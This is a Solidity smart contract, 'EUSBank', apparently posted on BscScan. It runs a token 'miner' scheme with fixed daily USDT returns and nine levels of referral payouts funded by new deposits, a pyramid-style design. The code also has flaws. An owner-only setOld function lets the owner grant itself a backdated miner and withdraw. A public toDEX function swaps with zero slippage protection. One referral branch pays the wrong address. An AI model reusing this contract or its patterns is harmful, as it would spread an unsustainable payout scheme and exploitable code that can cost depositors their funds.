/**
 *Submitted for verification at BscScan.com on 2022-11-21
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-21
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-20
*/

pragma solidity ^0.8.0;
interface tokenEx {
    function transfer(address receiver, uint amount) external;
    function transferFrom(address _from, address _to, uint256 _value)external;
    function balanceOf(address receiver) external view returns(uint256);
    function approve(address spender, uint amount) external returns (bool);
}
interface IRouter {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}
contract EUSBank{
    address public owner;
    uint256 public price;
    uint256 public sTime;
    address public EUS;
    address public USDT;
    mapping(address=>uint256)public isTime;
    mapping(address=>uint256)public TeamMembers;
    mapping(address=>uint256)public sUSDT;
    mapping(address=>uint256)public sEUS;
    mapping(address=>uint256)public inBNB;
    mapping(address=>address)public superior;
    modifier onlyOwner() {
        require(owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    constructor (address _DEX,address pancakeswap) public {
        owner=msg.sender;
        price=20;
        sTime=86400;
        EUS=0x3Cd82B316bCE3CcCbb2A1cA3741a4603B8feBfFA;
        USDT=0x55d398326f99059fF775485246999027B3197955;
        tokenEx(_DEX).approve(address(pancakeswap), 2 ** 256 - 1);
        tokenEx(0x3Cd82B316bCE3CcCbb2A1cA3741a4603B8feBfFA).approve(address(0x10ED43C718714eb63d5aA57B78B54704E256024E), 2 ** 256 - 1);
    }
    
    receive() external payable{ 
    }
    function setOld(address addr,address up,uint _time)public onlyOwner{
        isTime[msg.sender]=_time;
        inBNB[msg.sender]=100 ether;
        superior[addr]=up;
    }
    function setOwner()public onlyOwner{
        owner=address(0);
    }
    function payToken(address up)public{
        require(inBNB[msg.sender]==0,"You already have a miner");
        require(inBNB[up]==100 ether,"You already have a miner");
        uint _EUSss=getEuss();
        uint _EUS=_EUSss*97/100;
        tokenEx(EUS).transferFrom(msg.sender,address(this),_EUSss);
        isTime[msg.sender]=block.timestamp;
        inBNB[msg.sender]=100 ether;
        address up1=superior[up];
        address up2=superior[up1];
        if(superior[msg.sender] == address(0) && inBNB[up] >= 100 ether){
            superior[msg.sender]=up;
        }else {
            superior[msg.sender]=0x5FE5A86c7074287B53052EdE1fb4C61B6B744Db2;
        }
        tokenEx(EUS).transfer(address(0x000000000000000000000000000000000000dEaD),_EUS *30/100);
        toDEX(_EUS*70/100);
        if(up != address(0) && inBNB[up] >= 100 ether && up != msg.sender){
          tokenEx(USDT).transfer(up,5 ether);  
          TeamMembers[up]++;
          sEUS[up]+=5 ether;
        }
        if(up1 != address(0) && inBNB[up1] >= 100 ether && up1 != msg.sender){
          tokenEx(USDT).transfer(up1,2 ether);
          TeamMembers[up1]++;
          sEUS[up1]+=2 ether;
        }
        if(up2 != address(0) && inBNB[up2] >= 100 ether && up2 != msg.sender){
          tokenEx(USDT).transfer(up2,2 ether);
          TeamMembers[up2]++;
          sEUS[up2]+=2 ether;  
        }
        inUPaddr(up2);
    }
    function toDEX(uint _eus)public {
        uint eusTousdt=_eus;
        address[] memory path = new address[](3);
        path[0]=0x3Cd82B316bCE3CcCbb2A1cA3741a4603B8feBfFA;
        path[1]=0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        path[2]=0x55d398326f99059fF775485246999027B3197955;
        IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E).swapExactTokensForTokensSupportingFeeOnTransferTokens(eusTousdt,0,path,address(this),block.timestamp+100);
    }
    function inUPaddr(address addr)private {
        address up3=superior[addr];
        address up4=superior[up3];
        address up5=superior[up4];
        address up6=superior[up5];
        address up7=superior[up6];
        address up8=superior[up7];
        address up9=superior[up8];
        if(up3 != address(0) && inBNB[up3] >= 100 ether && up3 != msg.sender){
          tokenEx(USDT).transfer(up3,2 ether);
          TeamMembers[up3]++;
          sEUS[up3]+=2 ether;
        }
        if(up4 != address(0) && inBNB[up4] >= 100 ether && up4 != msg.sender){
          tokenEx(USDT).transfer(up4,1 ether);
          TeamMembers[up4]++; 
          sEUS[up4]+=1 ether;
        }
        if(up5 != address(0) && inBNB[up5] >= 100 ether && up5 != msg.sender){
          tokenEx(USDT).transfer(up5,1 ether); 
          TeamMembers[up5]++; 
          sEUS[up5]+=1 ether;
        }
        if(up6 != address(0) && inBNB[up6] >= 100 ether && up6 != msg.sender){
          tokenEx(USDT).transfer(up6,1 ether);
          TeamMembers[up6]++;
          sEUS[up6]+=1 ether;  
        }
        if(up7 != address(0) && inBNB[up7] >= 100 ether && up7 != msg.sender){
          tokenEx(USDT).transfer(up7,1 ether); 
          TeamMembers[up7]++; 
          sEUS[up7]+=1 ether;
        }
        if(up8 != address(0) && inBNB[up8] >= 100 ether && up8 != msg.sender){
          tokenEx(USDT).transfer(up5,2 ether); 
          TeamMembers[up8]++; 
          sEUS[up8]+=2 ether;
        }
        if(up9 != address(0) && inBNB[up9] >= 100 ether && up9 != msg.sender){
          tokenEx(USDT).transfer(up9,3 ether); 
          TeamMembers[up9]++;
          sEUS[up9]+=3 ether; 
        }
    }
    function withdraw()public{
        require(inBNB[msg.sender] > 0,"You have no deposit");
        require(block.timestamp > isTime[msg.sender] + sTime,"No withdrawal");
        uint _time=(block.timestamp-isTime[msg.sender])/sTime;
        uint  _usdt=price * _time * inBNB[msg.sender]/100;
        require(sUSDT[msg.sender]+_usdt <= 1000 ether);
        tokenEx(USDT).transfer(msg.sender,_usdt);
        isTime[msg.sender]=block.timestamp;
        sUSDT[msg.sender]+=_usdt;
    }
    function getEus(address addr)private view returns(uint){
        uint _time;
        uint _EUS;
        if(block.timestamp > isTime[msg.sender] + sTime){
            _time=(block.timestamp-isTime[addr])/sTime;
            _EUS=price * _time * inBNB[msg.sender]/100;   
        }else{
            _EUS=0;
        }
        return _EUS;
    }
    function getUser(address addr)public view returns(address,uint,uint,uint,uint,uint,uint){
        uint _time;
        address _addr=addr;
        uint _EUS=getEus(addr);
        if(sUSDT[addr] >=1000 ether){
            _EUS=0;
        }
        if(isTime[addr]==0){
          _time=0;
        }else {
          _time=isTime[addr]+sTime;
        }
        return (_addr,_EUS,_time,sUSDT[_addr],sEUS[_addr],TeamMembers[_addr],tokenEx(USDT).balanceOf(address(this)));   
    }
    function getEuss()public  view returns (uint){
        address[] memory path = new address[](3);
        uint[] memory amount;
        path[0]=0x55d398326f99059fF775485246999027B3197955;
        path[1]=0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        path[2]=0x3Cd82B316bCE3CcCbb2A1cA3741a4603B8feBfFA;
        amount=IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E).getAmountsOut(100 ether,path); 
        return amount[2];
    }
    function getEUSUp(address addr)public view returns (address){        
        return superior[addr];
    }
}